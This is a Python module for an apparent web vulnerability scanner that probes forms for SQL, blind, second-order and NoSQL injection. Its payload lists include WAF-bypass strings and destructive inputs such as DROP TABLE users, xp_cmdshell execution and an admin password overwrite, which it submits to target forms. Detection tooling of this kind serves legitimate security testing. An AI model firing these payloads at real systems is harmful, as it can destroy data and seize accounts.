# scanners/deep/enhanced_sqli_scanner.py - UPDATED VERSION

import time
import re
from urllib.parse import urljoin
from ..standard.sqli_scanner import SQLIScanner

class EnhancedSQLIScanner(SQLIScanner):
    """Enhanced SQL Injection Scanner with Blind SQLi Detection"""
    
    def __init__(self, target_url, scan_id, config=None):
        super().__init__(target_url, scan_id, config)
        self.advanced_payloads = self._get_advanced_sqli_payloads()
        self.database_fingerprint = {}
        self.blind_detection_enabled = True
    
    def _get_advanced_sqli_payloads(self):
        """Get advanced SQL injection payloads including blind SQLi"""
        return {
            # Time-based blind SQLi - NEW
            'time_based_mysql': "' AND SLEEP(5)-- ",
            'time_based_postgres': "' AND pg_sleep(5)-- ",
            'time_based_mssql': "' WAITFOR DELAY '0:0:5'-- ",
            'time_based_oracle': "' AND (SELECT COUNT(*) FROM ALL_USERS T1, ALL_USERS T2, ALL_USERS T3, ALL_USERS T4, ALL_USERS T5)-- ",
            
            # Boolean-based blind SQLi - NEW
            'boolean_true': "' AND 1=1-- ",
            'boolean_false': "' AND 1=2-- ",
            'boolean_conditional': "' AND (SELECT SUBSTRING(@@version,1,1))='5'-- ",
            
            # Enhanced error-based SQLi
            'error_mysql': "' AND EXTRACTVALUE(0,CONCAT(0x7e,@@version))-- ",
            'error_postgres': "' AND 1=CAST(@@version AS INT)-- ",
            'error_mssql': "' AND 1=CONVERT(int,@@version)-- ",
            
            # Union-based with column count detection
            'union_columns': "' ORDER BY 10-- ",
            'union_advanced': "' UNION SELECT 1,2,3,4,5,6,7,8,9,10-- ",
            'union_data': "' UNION SELECT @@version,USER(),DATABASE()-- ",
            
            # Stacked queries
            'stacked_mysql': "'; DROP TABLE users-- ",
            'stacked_mssql': "'; EXEC xp_cmdshell('dir')-- ",
            
            # NoSQL Injection
            'nosql_operator': '{"$ne": null}',
            'nosql_regex': '{"$regex": ".*"}',
            'nosql_where': '{"$where": "this.id == this.id"}',
            'nosql_or': '[{"$where": "1==1"}]',
            
            # Second-order SQLi
            'second_order': "admin' -- ",
            'second_order_2': "test'; UPDATE users SET password='hacked' WHERE username='admin'-- ",
            
            # WAF bypass techniques
            'waf_bypass_1': "' /*!50000OR*/ 1=1-- ",
            'waf_bypass_2': "' OR 1=1-- -",
            'waf_bypass_3': "'/**/OR/**/1=1-- ",
            'waf_bypass_4': "'%0AOR%0A1=1-- ",
            'waf_bypass_5': "' UNION/*!50000SELECT*/1,2,3-- ",
            
            # Encoding bypass
            'url_encode': "%27%20OR%201%3D1--%20",
            'double_encode': "%2527%2520OR%25201%253D1--%2520",
            'unicode_encode': "%u0027%u0020OR%u00201%u003D1--%u0020",
            
            # Advanced techniques
            'polyglot_sqli': "1'; DROP TABLE users-- ",
            'benchmark': "' AND BENCHMARK(5000000,MD5('test'))-- ",
            'heavy_query': "' AND (SELECT COUNT(*) FROM information_schema.tables A, information_schema.tables B, information_schema.tables C)-- ",
        }
    
    def run_scan(self):
        """Run enhanced SQL injection scan with blind SQLi detection"""
        try:
            print(f"[*] Starting ENHANCED SQL injection scan for: {self.target_url}")
            self.update_progress(10, "💉 Starting enhanced SQL injection scan...")
            
            if self.check_stop_flag():
                return self._build_results('stopped')
            
            # Combine basic and advanced payloads
            all_payloads = {**self._get_sqli_payloads(), **self.advanced_payloads}
            
            # Test enhanced SQLi
            self.update_progress(50, "🔬 Testing advanced SQL injection...")
            self.check_pause_flag()
            self.test_enhanced_sqli(all_payloads)
            
            # Test blind SQLi specifically - NEW
            self.check_pause_flag()
            self.update_progress(70, "🎯 Testing blind SQL injection...")
            self.test_blind_sqli()
            
            # Test NoSQL injection
            self.check_pause_flag()
            self.update_progress(85, "🔄 Testing NoSQL injection...")
            self.test_nosql_injection()
            
            # Test second-order SQLi - NEW
            self.check_pause_flag()
            self.update_progress(90, "⚡ Testing second-order SQL injection...")
            self.test_second_order_sqli()
            
            if self.check_stop_flag():
                return self._build_results('stopped')
            
            # Check pause before finalizing
            self.check_pause_flag()
            
            # Finalize
            self.update_progress(95, "📊 Generating enhanced SQLi report...")
            security_score = self.calculate_security_score()
            
            self.update_progress(100, "✅ Enhanced SQL injection scan completed!")
            
            return self._build_results('completed', security_score)
            
        except Exception as e:
            print(f"[-] Enhanced SQLi scan error: {e}")
            return self._build_results('error', error_message=str(e))
    
    def test_enhanced_sqli(self, payloads):
        """Test enhanced SQLi with all payloads"""
        forms = self.extract_forms()
        for form in forms:
            if self.check_stop_flag():
                return
            self.check_pause_flag()
            
            vulnerabilities = self.test_form_submission(form, payloads, 'SQL Injection')
            self.vulnerabilities.extend(vulnerabilities)
    
    def test_blind_sqli(self):
        """NEW: Test for blind SQL injection vulnerabilities"""
        try:
            forms = self.extract_forms()
            for form in forms:
                if self.check_stop_flag():
                    return
                self.check_pause_flag()
                
                # Time-based blind SQLi testing
                time_payloads = {
                    'time_based_mysql': "' AND SLEEP(5)-- ",
                    'time_based_postgres': "' AND pg_sleep(5)-- ",
                    'time_based_mssql': "' WAITFOR DELAY '0:0:5'-- ",
                }
                
                for payload_name, payload in time_payloads.items():
                    if self.check_stop_flag():
                        return
                    self.check_pause_flag()
                    
                    start_time = time.time()
                    
                    data = {}
                    for input_field in form['inputs']:
                        if input_field['type'] in ['text', 'search', 'hidden', 'textarea']:
                            data[input_field['name']] = payload
                        else:
                            data[input_field['name']] = input_field.get('value', '')
                    
                    form_url = self._get_form_url(form)
                    form_method = form.get('method', 'get').lower()
                    
                    try:
                        if form_method == 'post':
                            success, response = self.safe_request('POST', form_url, data=data)
                        else:
                            success, response = self.safe_request('GET', form_url, params=data)
                        
                        response_time = time.time() - start_time
                        
                        if success and response_time > 4:  # Significant delay
                            self.vulnerabilities.append({
                                'category': 'Blind SQL Injection',
                                'risk_level': 'High',
                                'title': 'Time-Based Blind SQL Injection',
                                'description': f'Time-based blind SQL injection detected with payload: {payload_name}',
                                'location': form_url,
                                'payload': payload,
                                'evidence': f'Response delayed by {response_time:.2f} seconds',
                                'recommendation': 'Use parameterized queries and input validation'
                            })
                            break  # Found one, move to next form
                            
                    except Exception:
                        continue
                    
                    time.sleep(1)  # Be nice to the server
                
                # Boolean-based blind SQLi testing
                boolean_payloads = {
                    'boolean_true': "' AND 1=1-- ",
                    'boolean_false': "' AND 1=2-- ",
                }
                
                true_response = None
                false_response = None
                
                for payload_name, payload in boolean_payloads.items():
                    if self.check_stop_flag():
                        return
                    self.check_pause_flag()
                    
                    data = {}
                    for input_field in form['inputs']:
                        if input_field['type'] in ['text', 'search', 'hidden', 'textarea']:
                            data[input_field['name']] = payload
                        else:
                            data[input_field['name']] = input_field.get('value', '')
                    
                    form_url = self._get_form_url(form)
                    form_method = form.get('method', 'get').lower()
                    
                    try:
                        if form_method == 'post':
                            success, response = self.safe_request('POST', form_url, data=data)
                        else:
                            success, response = self.safe_request('GET', form_url, params=data)
                        
                        if success:
                            response_fingerprint = self._create_response_fingerprint(response)
                            
                            if payload_name == 'boolean_true':
                                true_response = response_fingerprint
                            elif payload_name == 'boolean_false':
                                false_response = response_fingerprint
                                
                    except Exception:
                        continue
                
                # Compare boolean responses
                if true_response and false_response and true_response != false_response:
                    self.vulnerabilities.append({
                        'category': 'Blind SQL Injection',
                        'risk_level': 'High',
                        'title': 'Boolean-Based Blind SQL Injection',
                        'description': 'Boolean-based blind SQL injection vulnerability detected',
                        'location': form_url,
                        'payload': 'Boolean true/false conditions',
                        'evidence': 'Different responses for true/false conditions',
                        'recommendation': 'Use parameterized queries and input validation'
                    })
                        
        except Exception as e:
            print(f"[-] Blind SQLi test error: {e}")
    
    def test_nosql_injection(self):
        """Test for NoSQL injection vulnerabilities"""
        try:
            forms = self.extract_forms()
            for form in forms:
                if self.check_stop_flag():
                    return
                self.check_pause_flag()
                
                nosql_payloads = {
                    'nosql_operator': '{"$ne": "invalid"}',
                    'nosql_regex': '{"$regex": ".*"}',
                    'nosql_where': '{"$where": "this.username == this.username"}'
                }
                
                for payload_name, payload in nosql_payloads.items():
                    if self.check_stop_flag():
                        return
                    self.check_pause_flag()
                    
                    data = {}
                    for input_field in form['inputs']:
                        if input_field['type'] in ['text', 'search', 'hidden', 'textarea']:
                            data[input_field['name']] = payload
                        else:
                            data[input_field['name']] = input_field.get('value', '')
                    
                    form_url = self._get_form_url(form)
                    form_method = form.get('method', 'get').lower()
                    
                    try:
                        if form_method == 'post':
                            # Try sending as JSON
                            success, response = self.safe_request('POST', form_url, json=data)
                            if not success:
                                success, response = self.safe_request('POST', form_url, data=data)
                        else:
                            success, response = self.safe_request('GET', form_url, params=data)
                        
                        if success and response.status_code == 200:
                            # Check for successful authentication bypass
                            if 'login' not in response.url.lower() and 'error' not in response.text.lower():
                                self.vulnerabilities.append({
                                    'category': 'NoSQL Injection',
                                    'risk_level': 'High',
                                    'title': 'Potential NoSQL Injection',
                                    'description': f'NoSQL injection may be possible with payload: {payload_name}',
                                    'location': form_url,
                                    'payload': payload,
                                    'evidence': 'Request succeeded with NoSQL operator payload',
                                    'recommendation': 'Implement proper input validation and use parameterized queries for NoSQL databases'
                                })
                                break
                                
                    except Exception:
                        continue
                    
                    time.sleep(0.5)
                        
        except Exception as e:
            print(f"[-] NoSQL injection test error: {e}")
    
    def test_second_order_sqli(self):
        """NEW: Test for second-order SQL injection"""
        try:
            forms = self.extract_forms()
            second_order_payloads = {
                'second_order_user': "admin' -- ",
                'second_order_email': "test' OR '1'='1' -- @example.com",
                'second_order_comment': "test'; UPDATE users SET password='hacked' WHERE username='admin'-- ",
            }
            
            for form in forms:
                if self.check_stop_flag():
                    return
                self.check_pause_flag()
                
                # Look for forms that might store data for later use
                storage_indicators = ['user', 'name', 'email', 'comment', 'profile', 'account']
                is_storage_form = any(
                    any(indicator in field['name'].lower() for indicator in storage_indicators)
                    for field in form['inputs']
                )
                
                if is_storage_form:
                    for payload_name, payload in second_order_payloads.items():
                        if self.check_stop_flag():
                            return
                        self.check_pause_flag()
                        
                        vulnerabilities = self.test_form_submission(
                            form, 
                            {payload_name: payload}, 
                            'Second-Order SQL Injection'
                        )
                        self.vulnerabilities.extend(vulnerabilities)
                        
        except Exception as e:
            print(f"[-] Second-order SQLi test error: {e}")
    
    def _create_response_fingerprint(self, response):
        """Create fingerprint of response for blind SQLi detection"""
        fingerprint = {
            'status_code': response.status_code,
            'content_length': len(response.text),
            'has_error': 'error' in response.text.lower(),
            'has_success': 'success' in response.text.lower(),
            'has_login': 'login' in response.text.lower(),
            'has_welcome': 'welcome' in response.text.lower(),
        }
        return fingerprint
    
    def _get_form_url(self, form):
        """Get full URL for form action"""
        form_action = form.get('action', '')
        return urljoin(self.target_url, form_action)